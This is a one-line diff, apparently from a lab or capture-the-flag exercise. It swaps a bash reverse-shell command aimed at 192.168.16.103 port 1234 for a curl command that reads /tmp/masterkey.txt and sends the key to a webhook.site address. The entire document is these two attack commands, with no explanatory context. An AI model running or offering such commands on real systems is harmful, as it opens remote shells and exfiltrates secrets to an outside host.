@@ -1,1 +1,1 @@
-bash -c 'bash -i >& /dev/tcp/192.168.16.103/1234 0>&1'
+curl https://webhook.site/dc09f8e5-04f3-42a9-9f67-226e125882bc/?master_key=$(cat /tmp/masterkey.txt)
